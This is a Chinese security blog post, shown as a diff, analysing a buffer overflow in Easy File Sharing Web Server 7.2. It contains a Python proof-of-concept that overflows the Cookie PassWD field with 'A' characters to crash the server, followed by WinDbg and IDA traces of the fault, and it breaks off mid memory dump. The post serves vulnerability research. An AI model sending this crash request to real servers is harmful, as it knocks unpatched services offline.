@@ -1,0 +1,895 @@
+
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="一、漏洞环境exp是从https://www.exploit-db.com/exploits/42261/下载来的，不过为了便于分析，修改一下。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/python# Ex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Easy File Sharing Web Server 7.2 - Buffer Overflow 分析">
+<meta property="og:url" content="http://yoursite.com/2017/07/01/Easy-File-Sharing-Web-Server-7-2-"PassWD"-Buffer-Overflow-分析/index.html">
+<meta property="og:site_name" content="hackyzh'blog">
+<meta property="og:description" content="一、漏洞环境exp是从https://www.exploit-db.com/exploits/42261/下载来的，不过为了便于分析，修改一下。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/python# Ex">
+<meta property="og:updated_time" content="2017-07-01T14:22:15.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Easy File Sharing Web Server 7.2 - Buffer Overflow 分析">
+<meta name="twitter:description" content="一、漏洞环境exp是从https://www.exploit-db.com/exploits/42261/下载来的，不过为了便于分析，修改一下。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/python# Ex">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 1,
+      author: 'hackyzh'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/07/01/Easy-File-Sharing-Web-Server-7-2-"PassWD"-Buffer-Overflow-分析/"/>
+
+  <title> Easy File Sharing Web Server 7.2 - Buffer Overflow 分析 | hackyzh'blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?657dfc0df5002745c7be83cc9e53b12d";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">hackyzh'blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Easy File Sharing Web Server 7.2 - Buffer Overflow 分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2017-07-01T10:51:44+08:00" content="2017-07-01">
+              2017-07-01
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/07/01/Easy-File-Sharing-Web-Server-7-2-"PassWD"-Buffer-Overflow-分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/07/01/Easy-File-Sharing-Web-Server-7-2-"PassWD"-Buffer-Overflow-分析/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="一、漏洞环境"><a href="#一、漏洞环境" class="headerlink" title="一、漏洞环境"></a>一、漏洞环境</h2><p>exp是从<a href="https://www.exploit-db.com/exploits/42261/下载来的，不过为了便于分析，修改一下。" target="_blank" rel="external">https://www.exploit-db.com/exploits/42261/下载来的，不过为了便于分析，修改一下。</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP Request (PassWD) Buffer Overflow (SEH)</div><div class="line"># Date: 19 June 2017</div><div class="line"># Exploit Author: clubjk</div><div class="line"># Author Contact: jk@jkcybersecurity.com</div><div class="line"># Vendor Homepage: http://www.sharing-file.com</div><div class="line"># Software Link: https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe</div><div class="line"># Version: Easy File Sharing Web Server 7.2</div><div class="line"># Tested on: WinXP SP3</div><div class="line"># Usage: ./exploit.py</div><div class="line"># [*] Connecting to Target 192.168.188.132...standby...</div><div class="line"># [*] Successfully connected to 192.168.188.132...</div><div class="line"># [*] Sending improperly formed request...</div><div class="line"># [!] Request has been sent!</div><div class="line"></div><div class="line"></div><div class="line">import socket,os,time, sys</div><div class="line"> </div><div class="line">host = &quot;127.0.0.1&quot;</div><div class="line">port = 80</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">crash = &quot;/.:/&quot;                #unusual but needed</div><div class="line">crash = &quot;A&quot;*70</div><div class="line"></div><div class="line"> </div><div class="line">request = &quot;GET /vfolder.ghp HTTP/1.1\r\n&quot;</div><div class="line">request += &quot;Host: &quot; + host + &quot;\r\n&quot;</div><div class="line">request += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Accept-Language: en-US,en;q=0.5&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Accept-Encoding: gzip, deflate&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Referer: &quot; + &quot;http://&quot; + host + &quot;/&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Cookie: SESSIONID=16246; UserID=PassWD=&quot; + crash + &quot;; frmUserName=; frmUserPass=;&quot;</div><div class="line">request += &quot; rememberPass=202.197.208.215.201&quot;</div><div class="line">request += &quot;\r\n&quot;</div><div class="line">request += &quot;Connection: keep-alive&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;If-Modified-Since: Mon, 19 Jun 2017 17:36:03 GMT&quot; + &quot;\r\n&quot;</div><div class="line"></div><div class="line">print &quot;[*] Connecting to Target &quot; + host + &quot;...standby...&quot;</div><div class="line"></div><div class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line"></div><div class="line"></div><div class="line">try:</div><div class="line">	connect=s.connect((host, port))</div><div class="line">	print &quot;[*] Successfully connected to &quot; + host + &quot;!!!&quot;</div><div class="line">except:</div><div class="line">	print &quot;[!] &quot; + host + &quot; didn&apos;t respond\n&quot;</div><div class="line">	sys.exit(0)</div><div class="line"></div><div class="line"></div><div class="line">print &quot;[*] Sending improperly formed request...&quot;</div><div class="line">s.send(request + &quot;\r\n\r\n&quot;)</div><div class="line">print &quot;[!] Request has been sent!\n&quot;</div><div class="line">s.close()</div></pre></td></tr></table></figure></p>
+<p>环境：windows xp sp3、windng</p>
+<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><p>windbg附加软件，运行poc，捕获异常。堆栈回溯也没办法查看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0:004&gt; g</div><div class="line">(c64.87c): Access violation - code c0000005 (first chance)</div><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected and handled.</div><div class="line">eax=00000000 ebx=0012b901 ecx=41414141 edx=005aae28 esi=41414141 edi=0012c740</div><div class="line">eip=0052d7aa esp=01ba6e88 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</div><div class="line">fsws+0x12d7aa:</div><div class="line">0052d7aa 8b06            mov     eax,dword ptr [esi]  ds:0023:41414141=????????</div><div class="line">0:004&gt; kv</div><div class="line">ChildEBP RetAddr  Args to Child              </div><div class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</div><div class="line">01ba7624 00000000 00000000 01ba758c 01ba75a0 fsws+0x12d7aa</div></pre></td></tr></table></figure></p>
+<p>只能借助ida来分析了，跳转到异常地址，查看其所在的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:0052D7A7 ; void __thiscall sub_52D7A7(void *)</div><div class="line">.text:0052D7A7 sub_52D7A7      proc near               ; CODE XREF: sub_4013B0+2Bp</div><div class="line">.text:0052D7A7                                         ; sub_4013B0+65p ...</div><div class="line">.text:0052D7A7                 push    esi</div><div class="line">.text:0052D7A8                 mov     esi, ecx</div><div class="line">.text:0052D7AA                 mov     eax, [esi]   //esi来源于ecx</div><div class="line">                             ......</div></pre></td></tr></table></figure></p>
+<p>由于这次的漏洞分析分析过程太麻烦了，我直接贴出函数的调用关系</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0042e920-&gt;0042a930-&gt;00412a50-&gt;0052d7a7</div></pre></td></tr></table></figure>
+<p>0052d7a7这个地址所在的函数就是异常函数，关键是上层函数，对这个下个断点。然后逐步分析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">0:004&gt; bp 00412A50</div><div class="line">*** WARNING: Unable to verify checksum for C:\EFS Software\Easy File Sharing Web Server\fsws.exe</div><div class="line">*** ERROR: Module load completed but symbols could not be loaded for C:\EFS Software\Easy File Sharing Web Server\fsws.exe</div><div class="line">0:004&gt; g</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=01ba6e80 ebx=0012b90d ecx=01ba7624 edx=011345c1 esi=00000000 edi=0012c740</div><div class="line">eip=00412a50 esp=01ba6e7c ebp=01ba7624 iopl=0         nv up ei pl nz na po nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</div><div class="line">fsws+0x12a50:</div><div class="line">00412a50 6aff            push    0FFFFFFFFh</div><div class="line">0:004&gt; dd esp</div><div class="line">01ba6e7c  0042b2ec 012f46b0 012f4740 011345c0</div><div class="line">01ba6e8c  00000000 01ba7624 0012b9d0 01ba7240</div><div class="line">01ba6e9c  00000200 012f8fac 0093003d 01133bd8</div><div class="line">01ba6eac  011345c0 0131b05c 00000000 01134520</div><div class="line">01ba6ebc  0019a8e8 005a38e8 005a38e8 01ba6e88</div><div class="line">01ba6ecc  01ba6eb0 0012b9d0 01ba6e80 01ba6e84</div><div class="line">01ba6edc  003eaf18 015a12c0 ffffff00 01134480</div><div class="line">01ba6eec  005a38e8 003e0000 01133bd8 003eaf00</div><div class="line">0:004&gt; dc 012f46b0</div><div class="line">012f46b0  73736150 413d4457 41414141 41414141  PassWD=AAAAAAAAA</div><div class="line">012f46c0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46d0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46e0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46f0  41414141 41414141 41414141 00000041  AAAAAAAAAAAAA...</div><div class="line">012f4700  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4710  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4720  00000000 00000000 00000000 00000000  ................</div><div class="line">..........  中间部分省略</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=7ffdb000 edx=005aae28 esi=00000001 edi=01ba7624</div><div class="line">eip=00413d95 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d95:</div><div class="line">00413d95 8b8c2410010000  mov     ecx,dword ptr [esp+110h] ss:0023:01ba6e70=41414141</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000001 edi=01ba7624</div><div class="line">eip=00413d9c esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d9c:</div><div class="line">00413d9c 5f              pop     edi</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000001 edi=0012c740</div><div class="line">eip=00413d9d esp=01ba6d64 ebp=ffffffff iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d9d:</div><div class="line">00413d9d 5e              pop     esi</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413d9e esp=01ba6d68 ebp=ffffffff iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d9e:</div><div class="line">00413d9e 5d              pop     ebp</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413d9f esp=01ba6d6c ebp=01ba7624 iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d9f:</div><div class="line">00413d9f 64890d00000000  mov     dword ptr fs:[0],ecx fs:003b:00000000=01ba6e70</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413da6 esp=01ba6d6c ebp=01ba7624 iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13da6:</div><div class="line">00413da6 5b              pop     ebx</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413da7 esp=01ba6d70 ebp=01ba7624 iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13da7:</div><div class="line">00413da7 81c40c010000    add     esp,10Ch</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413dad esp=01ba6e7c ebp=01ba7624 iopl=0         nv up ei pl nz na po nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</div><div class="line">fsws+0x13dad:</div><div class="line">00413dad c21000          ret     10h</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00420041 esp=01ba6e90 ebp=01ba7624 iopl=0         nv up ei pl nz na po nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</div><div class="line">fsws+0x20041:</div><div class="line">00420041 2424            and     al,24h</div><div class="line">0:004&gt; p</div><div class="line">eax=00000000 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00420043 esp=01ba6e90 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">fsws+0x20043:</div><div class="line">00420043 85c0            test    eax,eax</div><div class="line">0:004&gt; p</div><div class="line">eax=00000000 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00420045 esp=01ba6e90 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">fsws+0x20045:</div><div class="line">00420045 0f94c3          sete    bl</div><div class="line">0:004&gt; p</div><div class="line">eax=00000000 ebx=0012b901 ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00420048 esp=01ba6e90 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">fsws+0x20048:</div><div class="line">00420048 e85ad71000      call    fsws+0x12d7a7 (0052d7a7)</div><div class="line">0:004&gt; p</div><div class="line">(bbc.108): Access violation - code c0000005 (first chance)</div><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected and handled.</div><div class="line">eax=00000000 ebx=0012b901 ecx=41414141 edx=005aae28 esi=41414141 edi=0012c740</div><div class="line">eip=0052d7aa esp=01ba6e88 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</div><div class="line">fsws+0x12d7aa:</div><div class="line">0052d7aa 8b06            mov     eax,dword ptr [esi]  ds:0023:41414141=????????</div></pre></td></tr></table></figure></p>
+<p>可以看到上面部分ecx来源于esp+110，然后综合esi来源于ecx，esi来源于esp+110。但是esp+110处的无效地址是怎么来的呢？<br>还是来到这个函数的关键位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div></pre></td><td class="code"><pre><div class="line">0:004&gt; bp 0412cc7</div><div class="line">*** WARNING: Unable to verify checksum for C:\EFS Software\Easy File Sharing Web Server\fsws.exe</div><div class="line">*** ERROR: Module load completed but symbols could not be loaded for C:\EFS Software\Easy File Sharing Web Server\fsws.exe</div><div class="line">0:004&gt; g</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000013 edx=012f46b0 esi=012f46b0 edi=01ba6e30</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; dc esi</div><div class="line">012f46b0  73736150 413d4457 41414141 41414141  PassWD=AAAAAAAAA</div><div class="line">012f46c0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46d0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46e0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46f0  41414141 41414141 41414141 00000041  AAAAAAAAAAAAA...</div><div class="line">012f4700  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4710  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4720  00000000 00000000 00000000 00000000  ................</div><div class="line">0:004&gt; dc edi</div><div class="line">01ba6e30  7c80be80 ffffffff 7c80be76 0052dc3f  ...|....v..|?.R.</div><div class="line">01ba6e40  011343e0 01ba6eac 00522d39 ffffffff  .C...n..9-R.....</div><div class="line">01ba6e50  0012c740 00000000 0012b90d 01ba6e8c  